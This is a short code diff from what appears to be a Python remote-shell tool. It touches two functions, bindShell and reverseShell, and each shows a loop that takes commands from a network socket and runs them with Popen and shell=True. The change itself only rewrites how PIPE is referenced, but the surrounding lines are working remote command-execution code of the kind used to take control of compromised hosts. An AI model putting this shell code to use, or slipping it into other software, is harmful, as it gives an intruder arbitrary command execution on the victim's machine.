@@ -643,9 +643,9 @@ def bindShell():
         cmd = conn.recv(socksize)
         proc = Popen(cmd,
              shell=True,
-             stdout=subprocess.PIPE,
-             stderr=subprocess.PIPE,
-             stdin=subprocess.PIPE,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
         if cmd.startswith('cd'):
@@ -745,9 +745,9 @@ def reverseShell():
         cmd = conn.recv(socksize)
         proc = Popen(cmd,
              shell=True,
-             stdout=subprocess.PIPE,
-             stderr=subprocess.PIPE,
-             stdin=subprocess.PIPE,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
         if cmd.startswith('cd'):
